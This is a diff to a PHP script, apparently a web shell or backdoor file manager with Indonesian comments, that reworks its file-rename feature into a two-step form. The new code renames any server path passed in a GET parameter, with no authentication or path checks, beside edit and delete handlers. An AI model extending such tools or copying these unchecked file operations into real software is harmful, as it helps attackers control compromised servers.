@@ -141,10 +141,34 @@ if(isset($_GET['edit'])){
   exit;
 }
 
-if(isset($_GET['rename'])&&isset($_POST['newname'])){
-  $old=$_GET['rename'];$new=$lokasi.'/'.$_POST['newname'];
-  if(rename($old,$new))echo"<center><span style='color:#6f6'>Renamed.</span></center>";
-  else echo"<center><span style='color:#f66'>Failed rename.</span></center>";
+// === fitur rename ===
+if (isset($_GET['rename'])) {
+    $target = $_GET['rename'];
+
+    // kalau belum submit, tampilkan form rename
+    if (!isset($_POST['rename_do'])) {
+        echo "<form method='post' style='text-align:center;margin-top:20px'>
+        <h3>Rename: ".htmlspecialchars(basename($target))."</h3>
+        <input type='text' name='newname' value='".htmlspecialchars(basename($target))."' 
+         style='width:300px;padding:6px;border-radius:4px;background:#0b0b18;color:#bfefff;
+         border:1px solid rgba(160,90,255,0.4);font-family:monospace;'>
+        <input type='hidden' name='rename_do' value='1'>
+        <input type='submit' value='Change Name'>
+        </form>";
+        exit;
+    }
+
+    // kalau sudah submit
+    if (isset($_POST['rename_do'])) {
+        $new = $lokasi.'/'.trim($_POST['newname']);
+        if (rename($target, $new)) {
+            echo "<center><span style='color:#6f6'>Renamed to: ".htmlspecialchars(basename($new))."</span></center>";
+        } else {
+            echo "<center><span style='color:#f66'>Failed to rename.</span></center>";
+        }
+        echo "<center><a href='?path=".urlencode($lokasi)."' style='color:#59d6ff'>Back</a></center>";
+        exit;
+    }
 }
 
 if(isset($_GET['delete'])){
